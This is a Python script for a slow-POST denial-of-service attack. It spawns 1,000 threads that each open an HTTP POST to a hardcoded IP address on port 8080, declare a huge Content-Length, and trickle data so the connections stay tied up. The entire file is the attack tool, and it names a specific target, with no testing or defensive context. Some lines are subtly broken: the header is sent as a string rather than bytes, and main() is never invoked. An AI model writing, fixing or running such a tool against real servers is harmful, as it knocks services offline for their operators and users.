import threading
import socket
from time import sleep

class Attacker(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.stopped = False

    def stop(self):
        self.stopped = True

    def attack(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.host, self.port))
            s.settimeout(1)
            s.send(
                'POST ' + self.path + ' HTTP/1.1\r\n' +
                'Host: ' + self.host + '\r\n' +
                'Connection: close\r\n' +
                'Content-Length: 1000000\r\n' +
                '\r\n'
            )

            while not self.stopped:
                s.send('abc=123&'.encode())
                sleep(100)

            s.close()

    def run(self):
        while True:
            print(self.name)
            self.attack()


def main():
    attackers = []
    try:
        for i in range(1000):
            attacker = Attacker('212.182.24.27', 8080)
            attacker.path = '/'
            attacker.start()
            attackers.append(attacker)
        while True:
            sleep(1)
    except KeyboardInterrupt:
        for attacker in attackers:
            attacker.stop()
        for attacker in attackers:
            attacker.join()
